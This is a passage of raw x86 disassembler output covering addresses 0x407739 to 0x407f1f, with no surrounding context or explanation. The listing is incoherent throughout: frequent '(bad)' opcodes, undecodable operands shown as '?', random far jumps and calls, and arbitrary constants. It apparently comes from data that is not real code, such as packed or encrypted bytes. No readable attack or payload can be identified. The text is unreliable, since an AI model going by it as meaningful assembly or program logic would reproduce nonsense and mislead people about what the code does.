  407739:	or     DWORD PTR [ebp+ebp*4+0x7f264380],0x973c1a3d
  407744:	fcomp  QWORD PTR [esi]
  407746:	(bad)  
  407747:	out    0xe6,eax
  407749:	push   ds
  40774a:	out    0xa0,al
  40774c:	and    DWORD PTR [eax-0x71aa4546],ecx
  407752:	xchg   eax,esi
  407754:	mov    dl,0xd
  407756:	pop    edi
  407757:	mov    edx,0x707be859
  40775c:	sbb    DWORD PTR ds:0x80d54131,0xffffffd7
  407763:	fild   WORD PTR [esi-0x38]
  407766:	mov    esi,0xb2fcd1cb
  40776b:	xor    al,0x3b
  40776d:	jbe    0x40779c
  40776f:	mov    bl,0xd1
  407771:	sahf   
  407772:	fisub  WORD PTR [edi-0x3b45c893]
  407778:	mov    BYTE PTR [edi],ch
  40777a:	jb     0x4077a4
  40777c:	mov    bh,BYTE PTR [ebp+0x5d]
  40777f:	fdiv   DWORD PTR [ebp+eax*8-0x2d71147c]
  407786:	adc    esi,ebp
  407788:	sub    ebp,ebp
  40778a:	sbb    ebx,ebx
  40778c:	or     eax,0x73beb701
  407791:	pmulhuw mm4,QWORD PTR [edx+0x3f]
  407795:	(bad)  
  407796:	fsub   DWORD PTR [ecx]
  407798:	jmp    0x8491153d
  40779d:	inc    eax
  40779e:	retf   
  40779f:	dec    esp
  4077a0:	dec    edx
  4077a1:	cmp    DWORD PTR [eax+0x18],ecx
  4077a4:	add    eax,0x5487b2b0
  4077a9:	pop    eax
  4077aa:	jae    0x4077ce
  4077ac:	addr16 mov edi,0xb63d4bf1
  4077b2:	push   ebx
  4077b3:	outs   dx,BYTE PTR ds:[esi]
  4077b4:	fnstenv [ebx+0x63cfd238]
  4077ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077bb:	mov    edi,0x450b29bc
  4077c0:	les    ebp,FWORD PTR ds:0x460f8f57
  4077c6:	cs dec edi
  4077c8:	repz jb 0x4077e7
  4077cb:	mov    eax,0xda8869b0
  4077d0:	sub    BYTE PTR [eax],dh
  4077d2:	rcl    BYTE PTR [ebx+0x251572ce],1
  4077d8:	test   DWORD PTR [esi+0x1c],edi
  4077db:	push   ecx
  4077dc:	popf   
  4077dd:	cld    
  4077de:	es cmp eax,ebx
  4077e1:	sub    edi,DWORD PTR [ecx+0x537c166a]
  4077e7:	ins    BYTE PTR es:[edi],dx
  4077e8:	sbb    edx,DWORD PTR [esi-0x5e9fea31]
  4077ee:	inc    ebp
  4077ef:	sub    DWORD PTR [ecx],ebx
  4077f1:	jne    0x407819
  4077f3:	add    eax,0x56549cef
  4077f8:	fsub   st,st(6)
  4077fa:	add    DWORD PTR [edi+0x1d1d15b6],esp
  407800:	or     BYTE PTR [esi+0x72],dh
  407803:	push   0xf445d7d3
  407808:	sub    ah,BYTE PTR [eax+0x17e69cb5]
  40780e:	test   DWORD PTR [eax+0x7e],ebp
  407811:	cli    
  407812:	dec    ebp
  407813:	jnp    0x407852
  407815:	aaa    
  407816:	aam    0xf0
  407818:	dec    edi
  407819:	sub    bl,BYTE PTR [eax-0x7bb736c6]
  40781f:	aas    
  407820:	mov    ds:0xa9ad45b,al
  407825:	jmp    0x49b0:0x174b1b69
  40782c:	push   0x64
  40782e:	sbb    esp,DWORD PTR [edx+0x530a8d44]
  407834:	mov    bh,0x96
  407836:	pop    eax
  407837:	imul   eax,DWORD PTR [ecx+0x7f557e9c],0xffffffd9
  40783e:	retf   0xe185
  407841:	jns    0x4077da
  407843:	sub    al,0x61
  407845:	clc    
  407846:	add    dl,BYTE PTR [edx+esi*1-0x66]
  40784a:	je     0x407833
  40784c:	(bad)  
  40784d:	arpl   di,cx
  40784f:	and    edx,ebp
  407851:	lods   al,BYTE PTR ds:[esi]
  407852:	inc    edi
  407853:	pushf  
  407854:	sub    al,0x97
  407856:	sbb    DWORD PTR [edx+0x5ee06f53],esp
  40785c:	and    bl,BYTE PTR [esp+edx*8-0x78883455]
  407863:	pop    ebp
  407864:	in     al,0xfa
  407866:	shl    cl,cl
  407868:	hlt    
  407869:	sar    DWORD PTR [ebx+0x2],1
  40786c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40786d:	out    dx,al
  40786e:	fcomi  st,st(5)
  407870:	popf   
  407871:	jae    0x407853
  407873:	push   esp
  407874:	mov    eax,0x8b512fe8
  407879:	sub    al,0x87
  40787b:	test   BYTE PTR [ecx-0x5c],ch
  40787e:	xchg   ecx,eax
  40787f:	icebp  
  407880:	int3   
  407881:	xchg   edx,eax
  407882:	in     eax,dx
  407883:	ja     0x40783f
  407885:	hlt    
  407886:	out    0x35,eax
  407888:	clc    
  407889:	mov    bh,0x83
  40788b:	pop    ebp
  40788c:	pop    ss
  40788d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40788e:	mov    edi,0x801f9241
  407893:	dec    ebp
  407894:	(bad)  
  407895:	jne    0x4078a8
  407897:	mov    ah,0x2a
  407899:	sub    DWORD PTR [esi-0x2c],0xffffffa7
  40789d:	sbb    DWORD PTR [ebx+0x2db3508d],edx
  4078a3:	test   al,0x1a
  4078a5:	inc    DWORD PTR [eax+0x23]
  4078a8:	retf   
  4078a9:	js     0x407887
  4078ab:	nop
  4078ac:	mov    ebx,0x30dac891
  4078b1:	mov    bl,BYTE PTR [eax+esi*1-0x6d]
  4078b5:	stos   BYTE PTR es:[edi],al
  4078b6:	jmp    0xcc4f369f
  4078bb:	jmp    0x5ce0:0xb4acff6d
  4078c2:	mov    ebp,DWORD PTR [esi-0x2e]
  4078c5:	mov    BYTE PTR [edi+0x5e5b68e4],0xc5
  4078cc:	xchg   ecx,eax
  4078cd:	jmp    0x40785d
  4078cf:	aas    
  4078d0:	out    dx,al
  4078d1:	pop    ebx
  4078d2:	push   0xaf25b781
  4078d7:	xor    DWORD PTR [ebp+0x5d],ebp
  4078da:	lahf   
  4078db:	pop    ebp
  4078dc:	xor    cl,BYTE PTR [ebp-0x7462113b]
  4078e2:	mov    ah,0x66
  4078e4:	popf   
  4078e5:	sbb    DWORD PTR [ecx+0x1a],ecx
  4078e8:	mov    BYTE PTR [edx*4+0x63cc59dd],ch
  4078ef:	out    0x87,eax
  4078f1:	sbb    BYTE PTR [ebp+0x66],ah
  4078f4:	jmp    0x2d5f:0x95ec51ff
  4078fb:	cs jmp 0xe76af1e0
  407901:	ins    BYTE PTR es:[edi],dx
  407902:	jno    0x407932
  407904:	pop    edi
  407905:	inc    esp
  407906:	cld    
  407907:	xlat   BYTE PTR ds:[ebx]
  407908:	ffreep st(4)
  40790a:	imul   edx,DWORD PTR [edx],0x6
  40790d:	or     DWORD PTR [ebx-0x77],0x89ebd949
  407914:	(bad)  
  407916:	sbb    BYTE PTR [eax-0x63],dl
  407919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40791a:	pop    ds
  40791b:	mov    eax,0xefe6f615
  407920:	repnz fsubr st(6),st
  407923:	cld    
  407924:	mov    esi,0x753b9963
  407929:	sbb    BYTE PTR [eax+eiz*8+0x52],dh
  40792d:	jnp    0x407949
  40792f:	push   es
  407930:	adc    cl,0xcf
  407933:	or     BYTE PTR [esp+esi*2-0x27c55519],al
  40793a:	sub    al,0xca
  40793c:	add    bh,bh
  40793e:	arpl   WORD PTR [eax+0x5c],sp
  407941:	test   al,0x3
  407943:	add    eax,0x35712d7c
  407948:	test   al,0x47
  40794a:	sbb    BYTE PTR [eax-0x54],0xa7
  40794e:	fstp   TBYTE PTR [eax-0x67]
  407951:	sti    
  407952:	cmp    DWORD PTR [edx-0x3d955e0a],0xec59d5d9
  40795c:	xchg   dl,al
  40795e:	(bad)  
  40795f:	rcl    eax,0x7e
  407962:	hlt    
  407963:	mov    ?,WORD PTR [ebx*4+0x366f5493]
  40796a:	mov    ds:0x64d03c59,al
  40796f:	jp     0x4079e9
  407971:	(bad)  
  407972:	fld    DWORD PTR [edx]
  407974:	fld    QWORD PTR [ebp+0x1d]
  407977:	or     esp,DWORD PTR [eax-0x5a1f2607]
  40797d:	out    dx,eax
  40797e:	out    dx,al
  40797f:	jo     0x407967
  407981:	sbb    ecx,DWORD PTR [ecx+esi*1-0xd621bbc]
  407988:	dec    eax
  407989:	inc    edi
  40798a:	inc    esi
  40798b:	pop    edi
  40798c:	sbb    ebp,DWORD PTR [ebp-0x26]
  40798f:	dec    esp
  407990:	jns    0x4079b6
  407992:	pop    es
  407993:	pop    ds
  407994:	fsubr  DWORD PTR [edx]
  407996:	dec    edi
  407997:	jnp    0x407a09
  407999:	cmp    DWORD PTR [esi+eax*8],edx
  40799c:	inc    eax
  40799d:	push   ebx
  40799e:	stc    
  40799f:	scas   ax,WORD PTR es:[edi]
  4079a1:	fwait
  4079a2:	pop    ds
  4079a3:	pop    esi
  4079a4:	shr    BYTE PTR [eax],cl
  4079a6:	jmp    0x40794b
  4079a8:	aam    0x9f
  4079aa:	push   edx
  4079ab:	test   al,0x8b
  4079ad:	sahf   
  4079ae:	test   eax,0x962d0cc
  4079b3:	push   edi
  4079b4:	cld    
  4079b5:	sub    ebp,DWORD PTR [ebx]
  4079b7:	cmp    al,0x92
  4079b9:	push   ebx
  4079ba:	sub    BYTE PTR [eax-0x7fdee31c],ah
  4079c0:	jmp    0x4079bb
  4079c2:	call   0x9178:0x72eccca9
  4079c9:	mov    DWORD PTR [eax-0x3e39662],esi
  4079cf:	sahf   
  4079d0:	imul   ecx,DWORD PTR [ebp-0x47d9ff68],0xd96f1479
  4079da:	or     ch,BYTE PTR [edx+0x522b0cae]
  4079e0:	pop    ebx
  4079e1:	push   ds
  4079e2:	in     eax,0x86
  4079e4:	ret    0xd479
  4079e7:	es ret 
  4079e9:	xchg   ecx,eax
  4079ea:	es jg  0x407a49
  4079ed:	mov    cl,BYTE PTR [ecx-0x58f27a87]
  4079f3:	adc    ebx,eax
  4079f5:	imul   eax,DWORD PTR [ebp+0x1a3e1e9e],0xd7b1b58
  4079ff:	test   esp,esi
  407a01:	loope  0x407a44
  407a03:	(bad)  
  407a04:	ficom  DWORD PTR [ecx-0x30]
  407a07:	mov    dl,0x2a
  407a09:	enter  0xe9da,0xce
  407a0d:	aad    0xf3
  407a0f:	cmp    DWORD PTR [eax],eax
  407a11:	out    dx,al
  407a12:	jg     0x4079bd
  407a14:	mov    ch,0xfb
  407a16:	add    DWORD PTR [edx+0x5564d454],ecx
  407a1c:	xor    bh,BYTE PTR [eax-0x51]
  407a1f:	push   esp
  407a20:	and    ax,0xc6b5
  407a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a25:	pop    ebx
  407a26:	cmp    eax,0xbbdc0271
  407a2b:	jle    0x4079b0
  407a2d:	cld    
  407a2e:	outs   dx,DWORD PTR ds:[esi]
  407a2f:	(bad)  
  407a30:	sar    DWORD PTR [ebx+0x4a6338e0],1
  407a36:	stos   BYTE PTR es:[edi],al
  407a37:	out    0x34,eax
  407a39:	xor    BYTE PTR [edi-0x6cc91a44],0x98
  407a40:	xlat   BYTE PTR ds:[ebx]
  407a41:	mov    eax,ds:0xc0d9a85d
  407a46:	hlt    
  407a47:	dec    ebp
  407a48:	dec    esp
  407a49:	or     eax,0xf2fcfca3
  407a4e:	dec    ecx
  407a4f:	xchg   edx,eax
  407a50:	ds retf 0xd077
  407a54:	mov    eax,ds:0x9bc2f900
  407a59:	add    ecx,DWORD PTR [esi-0x3b]
  407a5c:	xchg   edx,eax
  407a5d:	aaa    
  407a5e:	stos   BYTE PTR es:[edi],al
  407a5f:	std    
  407a60:	(bad)  
  407a61:	mov    edx,eax
  407a63:	push   es
  407a64:	adc    al,0xd6
  407a66:	mov    edx,0xe0c1f3ec
  407a6b:	mov    ebp,0xe8c6d8cb
  407a70:	aad    0xb
  407a72:	retf   
  407a73:	pop    edi
  407a74:	daa    
  407a75:	cmp    eax,DWORD PTR [esi]
  407a77:	js     0x407a8e
  407a79:	xor    eax,0x92d0ce90
  407a7e:	out    0x34,al
  407a80:	ror    al,cl
  407a82:	xor    al,0xdc
  407a84:	mov    eax,0x7ca2ded7
  407a89:	and    BYTE PTR [edi],al
  407a8b:	into   
  407a8c:	stos   DWORD PTR es:[edi],eax
  407a8d:	jecxz  0x407a2d
  407a8f:	push   ecx
  407a90:	add    eax,0x3226a6b8
  407a95:	loope  0x407a94
  407a97:	and    eax,0x5b468714
  407a9c:	jle    0x407ad1
  407a9e:	mov    es,WORD PTR [edi]
  407aa0:	xchg   esi,eax
  407aa1:	ss dec esp
  407aa3:	pop    ebp
  407aa4:	dec    esi
  407aa5:	mov    dh,0x7d
  407aa7:	jmp    0x407ac8
  407aa9:	dec    eax
  407aaa:	mov    ecx,0x7a3e25dd
  407aaf:	into   
  407ab0:	add    cl,BYTE PTR [eax]
  407ab2:	inc    edx
  407ab3:	ret    
  407ab4:	test   al,0x67
  407ab6:	push   esi
  407ab7:	mov    ecx,DWORD PTR [ecx+0x7f5cbf85]
  407abd:	inc    eax
  407abe:	push   es
  407abf:	adc    al,0xdc
  407ac1:	js     0x407ae2
  407ac3:	out    dx,eax
  407ac4:	sub    esi,DWORD PTR gs:[ebp+edi*8+0x32]
  407ac9:	lds    ebp,FWORD PTR [ebp+0x1e]
  407acc:	push   ecx
  407acd:	jo     0x407ab7
  407acf:	add    BYTE PTR [edx-0x50],bh
  407ad2:	mov    bl,0xa5
  407ad4:	mov    bl,0x8f
  407ad6:	iret   
  407ad7:	push   es
  407ad8:	sub    BYTE PTR [ebx+ebp*1-0x74d94231],0x47
  407ae0:	(bad)  
  407ae2:	add    al,0x1
  407ae4:	(bad)  
  407ae5:	adc    ebx,DWORD PTR [ebp+0x1caf4617]
  407aeb:	loopne 0x407ab8
  407aed:	xlat   BYTE PTR ds:[ebx]
  407aee:	mov    BYTE PTR [ecx-0x1a],ch
  407af1:	push   0xffffffc6
  407af3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407af4:	dec    esp
  407af5:	int3   
  407af6:	xor    eax,0x6798a398
  407afb:	sub    ebp,DWORD PTR [edi]
  407afd:	(bad)
  407b01:	xor    esp,DWORD PTR cs:[edi]
  407b04:	mov    ebx,0x8b1475be
  407b09:	adc    edx,ebp
  407b0b:	cdq    
  407b0c:	frstor [edi]
  407b0e:	aam    0x8f
  407b10:	cmp    DWORD PTR [eax],0xd5f9b4fd
  407b16:	sub    eax,0x90972271
  407b1b:	test   eax,0xc30137e1
  407b21:	and    edi,DWORD PTR [edi]
  407b23:	adc    ecx,edi
  407b25:	jbe    0x407b42
  407b27:	hlt    
  407b28:	sbb    BYTE PTR [eax+0x67],cl
  407b2b:	rol    ecx,1
  407b2d:	push   ecx
  407b2e:	push   esi
  407b2f:	repnz inc ecx
  407b31:	add    DWORD PTR [eax+0x15],ecx
  407b34:	bound  edx,QWORD PTR [eax-0x5bd3f3a]
  407b3a:	xchg   esp,eax
  407b3b:	int    0x69
  407b3d:	fs in  al,0xb5
  407b40:	push   ss
  407b41:	clc    
  407b42:	pop    esi
  407b43:	stos   BYTE PTR es:[edi],al
  407b44:	neg    DWORD PTR [eax]
  407b46:	dec    eax
  407b47:	dec    esp
  407b48:	xchg   ebx,eax
  407b49:	sub    DWORD PTR [eax-0x63],esi
  407b4c:	mov    ecx,DWORD PTR [esi]
  407b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b4f:	popa   
  407b50:	mov    al,0x11
  407b52:	out    0xf9,eax
  407b54:	scas   al,BYTE PTR es:[edi]
  407b55:	repnz sub DWORD PTR [edx-0x4e],ecx
  407b59:	xlat   BYTE PTR ds:[ebx]
  407b5a:	gs iret 
  407b5c:	arpl   WORD PTR ds:0x303b54ec,dx
  407b62:	jae    0x407b09
  407b64:	mov    edi,0xfba5172a
  407b69:	pop    esp
  407b6a:	cmp    edx,DWORD PTR [edi]
  407b6c:	or     dl,al
  407b6e:	pushf  
  407b6f:	xor    cl,BYTE PTR [edi-0x77]
  407b72:	add    cl,0x88
  407b75:	mov    ebx,0x29f016dc
  407b7a:	mov    esi,0x3fbb97fc
  407b7f:	out    0xc8,eax
  407b81:	mov    esp,esi
  407b83:	sbb    al,0x57
  407b85:	leave  
  407b86:	sti    
  407b87:	out    dx,eax
  407b88:	nop
  407b89:	mov    WORD PTR [eax+eiz*4],?
  407b8c:	adc    dl,dl
  407b8e:	and    ebp,esi
  407b90:	adc    al,0x19
  407b92:	ret    
  407b93:	fld    TBYTE PTR [eax-0x794a4088]
  407b99:	mov    eax,ds:0xaef53d4d
  407b9e:	pusha  
  407b9f:	mov    edi,0xb7f39f24
  407ba4:	xor    eax,0x27d6b058
  407ba9:	push   eax
  407baa:	scas   al,BYTE PTR es:[edi]
  407bab:	add    DWORD PTR [ecx-0x194efa10],edx
  407bb1:	fisubr DWORD PTR [eax+0x6eb919a2]
  407bb7:	sbb    al,0x64
  407bb9:	xchg   edx,eax
  407bba:	(bad)  
  407bbb:	iret   
  407bbc:	fistp  QWORD PTR [esi+0x18]
  407bbf:	(bad)  
  407bc0:	pop    edi
  407bc1:	in     al,0x19
  407bc3:	xor    eax,0x453f18ae
  407bc8:	or     eax,0x7c8a4115
  407bcd:	ret    0xafdf
  407bd0:	dec    ecx
  407bd1:	dec    esi
  407bd2:	mov    ds:0xd36831e3,eax
  407bd7:	inc    edx
  407bd8:	ror    BYTE PTR [ebx*2+0xd9b14c2],cl
  407bdf:	xchg   edi,eax
  407be0:	jmp    0x2700:0xf41a8dc4
  407be7:	int3   
  407be8:	mov    dl,0xfa
  407bea:	add    ecx,DWORD PTR [eax]
  407bec:	xchg   edx,eax
  407bed:	adc    al,0x34
  407bef:	sub    al,0x91
  407bf1:	lahf   
  407bf2:	inc    esp
  407bf3:	sub    ah,BYTE PTR [ebp+esi*4+0x30]
  407bf7:	scas   eax,DWORD PTR es:[edi]
  407bf8:	mov    ebx,0xad150769
  407bfd:	adc    al,0x99
  407bff:	mov    ds:0x69811695,al
  407c04:	jecxz  0x407bbb
  407c06:	fwait
  407c07:	and    edi,edi
  407c09:	std    
  407c0a:	push   eax
  407c0b:	push   ebx
  407c0c:	push   0x4845a567
  407c11:	popf   
  407c12:	mov    dl,0x87
  407c14:	jle    0x407c78
  407c16:	sub    cl,BYTE PTR [edi]
  407c18:	call   0xc8dc:0xf0e33ffd
  407c1f:	data16 fsubr QWORD PTR [ebx+0x636f847f]
  407c26:	pushf  
  407c27:	shl    DWORD PTR [ebx],1
  407c29:	js     0x407c88
  407c2b:	rcl    BYTE PTR [ebx+0x41],1
  407c2e:	scas   eax,DWORD PTR es:[edi]
  407c2f:	add    eax,0x7f04f73c
  407c34:	nop
  407c35:	loopne 0x407cb2
  407c37:	(bad)  
  407c39:	lock push esp
  407c3b:	xrstor [esi+0x1a81f9b4]
  407c42:	and    eax,0x4f90924c
  407c47:	add    al,0xb0
  407c49:	inc    ebp
  407c4a:	pop    ebx
  407c4b:	jp     0x407c49
  407c4d:	outs   dx,BYTE PTR ds:[esi]
  407c4e:	mov    al,ds:0x57b2f844
  407c53:	outs   dx,BYTE PTR ds:[esi]
  407c54:	je     0x407c0a
  407c56:	mov    BYTE PTR [esi],cl
  407c58:	jle    0x407c39
  407c5a:	lods   eax,DWORD PTR ds:[esi]
  407c5b:	mov    ch,0x71
  407c5d:	mov    bh,0x16
  407c5f:	(bad)  
  407c61:	pop    ecx
  407c62:	jmp    0x55a844ac
  407c67:	stc    
  407c68:	mov    edx,0x5ed191b4
  407c6d:	loope  0x407cb5
  407c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c70:	fcmovu st,st(5)
  407c72:	and    edi,DWORD PTR [esi+0x5e]
  407c75:	dec    ebp
  407c76:	aam    0x50
  407c78:	inc    ecx
  407c79:	rol    DWORD PTR [esi],cl
  407c7b:	jns    0x407c1f
  407c7d:	and    edx,ecx
  407c7f:	xlat   BYTE PTR ds:[ebx]
  407c80:	xchg   esp,eax
  407c81:	sub    dh,ah
  407c83:	dec    eax
  407c84:	mov    esi,0xfa5b377e
  407c89:	test   al,0x15
  407c8b:	sub    BYTE PTR [ebp+ebp*8+0x61601ca5],dh
  407c92:	cld    
  407c93:	std    
  407c94:	dec    eax
  407c95:	mov    eax,ds:0x9c501b1b
  407c9a:	(bad)  
  407c9b:	int    0x32
  407c9d:	mov    edx,0xaf9b824a
  407ca2:	out    dx,eax
  407ca3:	mov    BYTE PTR [eax-0xe4ae4c7],ah
  407ca9:	xor    ebp,DWORD PTR [ecx+0x1]
  407cac:	inc    esi
  407cad:	test   DWORD PTR ss:[edx+0x1e],esi
  407cb1:	outs   dx,BYTE PTR ds:[esi]
  407cb2:	mov    WORD PTR [eax-0x6b14673b],cs
  407cb8:	je     0x407c4d
  407cba:	pop    ecx
  407cbb:	adc    eax,0x66d7e8b
  407cc0:	stos   DWORD PTR es:[edi],eax
  407cc1:	mul    BYTE PTR [eax+0x1c8d2d83]
  407cc7:	pop    ebp
  407cc8:	ds retf 0xd1ec
  407ccc:	fstp   QWORD PTR [ebx-0x60]
  407ccf:	fdivr  st(6),st
  407cd1:	jmp    0x407cfc
  407cd3:	scas   eax,DWORD PTR es:[edi]
  407cd4:	mov    eax,ds:0xd4581a8
  407cd9:	repz sub dl,BYTE PTR [ebx-0x7fc7bba]
  407ce0:	imul   esi,DWORD PTR [edi],0x50
  407ce3:	into   
  407ce4:	js     0x407ccf
  407ce6:	pop    eax
  407ce7:	ror    BYTE PTR [ebx],cl
  407ce9:	xchg   DWORD PTR [edi+0x79],ebp
  407cec:	dec    esp
  407ced:	repnz fdivr QWORD PTR [esi]
  407cf0:	aad    0x59
  407cf2:	push   ebx
  407cf3:	(bad)
  407cf7:	mov    bh,0xe7
  407cf9:	inc    esp
  407cfa:	outs   dx,DWORD PTR ds:[esi]
  407cfb:	cdq    
  407cfc:	push   ds
  407cfd:	jnp    0x407d10
  407cff:	push   es
  407d00:	jae    0x407d0e
  407d02:	sub    dl,BYTE PTR [edx]
  407d04:	call   0x292a6f05
  407d09:	dec    ecx
  407d0a:	mov    DWORD PTR [ecx-0x20],esp
  407d0d:	stc    
  407d0e:	and    eax,DWORD PTR [ebp+0x3edc8f88]
  407d14:	out    dx,al
  407d15:	icebp  
  407d16:	daa    
  407d17:	int3   
  407d18:	inc    eax
  407d19:	jp     0x407ce5
  407d1b:	pop    edi
  407d1c:	js     0x407d1f
  407d1e:	leave  
  407d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d20:	sub    al,0x76
  407d22:	gs shr ch,cl
  407d25:	ja     0x407cdc
  407d27:	cld    
  407d28:	xchg   edx,eax
  407d29:	pop    ss
  407d2a:	xchg   BYTE PTR [ebx+0x22af38a9],dl
  407d30:	cld    
  407d31:	mov    bl,0xf8
  407d33:	and    DWORD PTR [ebp+0x41fcd392],ebp
  407d39:	push   esp
  407d3a:	adc    dl,BYTE PTR [ebp+ebx*8-0x46b39c6e]
  407d41:	add    eax,0xa62e99b4
  407d46:	mov    cl,0x5d
  407d48:	aas    
  407d49:	fist   DWORD PTR [ebp-0x15]
  407d4c:	jno    0x407d42
  407d4e:	mov    cl,BYTE PTR [esi-0x4c7ffd66]
  407d54:	stc    
  407d55:	inc    edi
  407d56:	adc    DWORD PTR [edx+0x56],ebp
  407d59:	cmp    eax,0x64dac92
  407d5e:	mov    BYTE PTR [eax+edx*4+0x50214d3f],0x6f
  407d66:	pop    eax
  407d67:	into   
  407d68:	or     al,0x5a
  407d6a:	or     BYTE PTR [ebx+0x4c693739],dl
  407d70:	sub    BYTE PTR [ebp+0x5a513f5b],dh
  407d76:	adc    BYTE PTR [ebx],0x45
  407d79:	fistp  QWORD PTR [eax-0x2a]
  407d7c:	sub    eax,0x3f55d934
  407d81:	push   0x31
  407d83:	and    ah,dh
  407d85:	push   ss
  407d86:	jo     0x407d3f
  407d88:	ret    0x97cf
  407d8b:	mov    esp,0xf10c1b29
  407d90:	jmp    0x61d38ac9
  407d95:	mov    dh,0x1f
  407d97:	dec    esi
  407d98:	mov    esp,0xf2aeb5d8
  407d9d:	outs   dx,DWORD PTR ds:[esi]
  407d9e:	add    BYTE PTR [ebp-0x24e0c282],dl
  407da4:	or     DWORD PTR [ecx+0x2b],0x5c9c350e
  407dab:	adc    BYTE PTR [ebp-0x1e05adee],dh
  407db1:	add    BYTE PTR [ecx],al
  407db3:	mov    esp,0x212e8d4f
  407db8:	sbb    al,0x1a
  407dba:	gs jo  0x407d87
  407dbd:	dec    edx
  407dbe:	push   esp
  407dbf:	jns    0x407e07
  407dc1:	sahf   
  407dc2:	fstp   DWORD PTR [ecx+0x2c4bca49]
  407dc8:	pop    ecx
  407dc9:	das    
  407dca:	sub    BYTE PTR [ebp+0x2d9035eb],0x2a
  407dd1:	call   0xa9de2d97
  407dd6:	(bad)  
  407dd8:	pop    ds
  407dd9:	aas    
  407dda:	sbb    bh,BYTE PTR [ebx+0x59]
  407ddd:	mov    edi,0x7221cdec
  407de2:	ss cwde 
  407de4:	adc    BYTE PTR [edi],0xe1
  407de7:	arpl   WORD PTR [eax],sp
  407de9:	arpl   WORD PTR [ecx-0x6b],ax
  407dec:	jecxz  0x407d9d
  407dee:	in     eax,0xc4
  407df0:	cli    
  407df1:	push   0x7990725
  407df6:	fisubr WORD PTR [eax]
  407df8:	fdiv   QWORD PTR [eax]
  407dfa:	jmp    0xa7b176ab
  407dff:	cmp    BYTE PTR [eax+0x123d027],cl
  407e05:	jno    0x407dd9
  407e07:	sti    
  407e08:	cwde   
  407e09:	ja     0x407e4f
  407e0b:	xor    eax,0xb582ff2e
  407e10:	ins    DWORD PTR es:[edi],dx
  407e11:	cld    
  407e12:	lods   al,BYTE PTR ds:[esi]
  407e13:	fld    DWORD PTR [ebx]
  407e15:	outs   dx,DWORD PTR ds:[esi]
  407e16:	jno    0x407e32
  407e18:	mov    bl,0xb8
  407e1a:	sbb    DWORD PTR [edi+eax*4-0x1d4000b7],eax
  407e21:	add    al,BYTE PTR [ebp-0x26]
  407e24:	nop
  407e25:	push   ebx
  407e26:	fbld   TBYTE PTR [ecx]
  407e28:	pop    ds
  407e29:	and    ah,BYTE PTR [ebx-0x3b]
  407e2c:	pop    esp
  407e2d:	mov    al,0xe3
  407e2f:	xchg   DWORD PTR [edx+0x6cd9fa2c],edx
  407e35:	popa   
  407e36:	es sti 
  407e38:	pop    es
  407e39:	xchg   edi,eax
  407e3a:	or     eax,0xd0c28391
  407e3f:	cmp    BYTE PTR [ebx+eax*8],bh
  407e42:	or     BYTE PTR [edx],0x2e
  407e45:	stos   BYTE PTR es:[edi],al
  407e46:	jge    0x407eb5
  407e48:	push   edi
  407e49:	imul   eax,DWORD PTR [edx+0x2c],0x64e2d7ab
  407e50:	sbb    eax,0xc7b50560
  407e55:	(bad)  
  407e56:	jmp    0xc664182c
  407e5b:	jp     0x407dec
  407e5d:	test   edi,ecx
  407e5f:	nop
  407e60:	inc    ecx
  407e61:	mov    ebx,0x1a72e165
  407e66:	arpl   ax,bx
  407e68:	push   ds
  407e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e6a:	jp     0x407e47
  407e6c:	xchg   ebx,eax
  407e6d:	aas    
  407e6e:	sbb    eax,0xd5281638
  407e73:	mov    ?,WORD PTR [eax-0x709c9662]
  407e79:	idiv   BYTE PTR [ebx+0x699c5797]
  407e7f:	sbb    dh,BYTE PTR [esi]
  407e81:	and    eax,0x6a6457d0
  407e86:	or     bl,BYTE PTR [eax-0x1f]
  407e89:	sbb    al,0x73
  407e8b:	adc    ebx,DWORD PTR [esi+0x3d]
  407e8e:	div    DWORD PTR [esi]
  407e90:	jmp    0x4c2c94a
  407e95:	mov    cl,0xe4
  407e97:	push   0x21f29888
  407e9c:	leave  
  407e9d:	scas   eax,DWORD PTR es:[edi]
  407e9e:	jl     0x407e34
  407ea0:	xor    al,BYTE PTR [esi-0x46247c0e]
  407ea6:	(bad)  
  407ea7:	jne    0x407e54
  407ea9:	pop    edi
  407eaa:	leave  
  407eab:	enter  0x1418,0xf9
  407eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb0:	arpl   WORD PTR [ebx+0x36550ee5],ax
  407eb6:	outs   dx,DWORD PTR ds:[esi]
  407eb7:	mov    al,ds:0x9ac18f8a
  407ebc:	icebp  
  407ebd:	mov    cl,bl
  407ebf:	lea    ecx,[ebx-0x72780c15]
  407ec5:	mov    al,ds:0x5e3094a4
  407eca:	sbb    BYTE PTR [eax-0x46b92d1c],0xe1
  407ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ed2:	aad    0xce
  407ed4:	pop    ss
  407ed5:	cs push cs
  407ed7:	and    dl,BYTE PTR [ecx+ebp*1+0x4c]
  407edb:	test   eax,0x57d44e88
  407ee0:	inc    edi
  407ee1:	jp     0x407f60
  407ee3:	call   ebp
  407ee5:	clc    
  407ee6:	add    DWORD PTR [eax+0x27],0xd34efeba
  407eed:	pop    ebx
  407eee:	cmp    al,0x63
  407ef0:	cmp    edx,0x43
  407ef3:	mov    dh,0xd0
  407ef5:	add    bl,BYTE PTR [ecx-0x364c631c]
  407efb:	jecxz  0x407f0e
  407efd:	sahf   
  407efe:	imul   edx,DWORD PTR [ecx-0x16],0xffffffd2
  407f02:	aaa    
  407f03:	pop    ebp
  407f04:	pop    ebx
  407f05:	ja     0x407e9a
  407f07:	in     eax,0xcd
  407f09:	xchg   esp,eax
  407f0a:	sti    
  407f0b:	or     ecx,esi
  407f0d:	leave  
  407f0e:	pop    ecx
  407f0f:	(bad)  
  407f10:	fadd   st(6),st
  407f12:	(bad)  
  407f13:	(bad)  
  407f14:	das    
  407f15:	popf   
  407f16:	in     al,0x57
  407f18:	sub    esi,edi
  407f1a:	mov    edi,0x8cdd8dd3
  407f1f:	push   ebp
